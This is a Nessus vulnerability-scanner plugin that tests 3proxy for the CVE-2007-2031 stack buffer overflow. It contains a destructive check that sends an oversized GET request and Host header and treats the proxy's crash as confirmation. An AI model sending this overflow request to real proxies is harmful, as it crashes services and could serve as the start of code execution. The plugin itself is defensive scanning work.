#
# This script was written by Marcin Kozlowski
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title (7/08/09)


include("compat.inc");

if(description)
{
 script_id(31094);
 script_version ("$Revision: 1.4 $");
 script_cve_id("CVE-2007-2031");
 script_bugtraq_id (23545);
 script_xref(name:"OSVDB", value:"35237");

 script_name(english:"3Proxy HTTP Proxy Crafted Transparent Request Remote Overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote proxy is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running 3proxy, an application proxy supporting
many protocols (Telnet, FTP, WWW, and more). 

A stack overflow vulnerability has been detected in 3proxy prior to
0.5.3h and 0.6b-devel before 20070413.  By sending a long host header
in HTTP GET request, a remote attacker could overflow a buffer and
execute arbitrary code." );
 script_set_attribute(attribute:"see_also", value:"http://3proxy.ru/0.5.3h/Changelog.txt" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/466650/100/100/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to 3proxy version 0.5.3h or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();


 script_summary(english:"Buffer overflow in 3Proxy");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2008-2009 Marcin Kozlowski");
 script_family(english:"Firewalls");
 script_dependencie("find_service2.nasl");
 script_require_ports("Services/http_proxy", 3128);

 exit(0);
}


include("http_func.inc");
include("misc_func.inc");
include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0);


ports = add_port_in_list(list:get_kb_list("Services/http_proxy"), port:3128);
foreach port (ports)
{
  if(get_port_state(port))
  {
    soc = open_sock_tcp(port);
    if(soc)
    {
      req = string("GET /", crap(4096), " HTTP/1.0\nHost: ", crap(1024),"\n\n");
      send(socket:soc,
      data:req);

      r = http_recv(socket:soc);
      close(soc);

      soc2 = open_sock_tcp(port);
      if(!soc2)security_hole(port);
      else close(soc2);
    }
  }
}
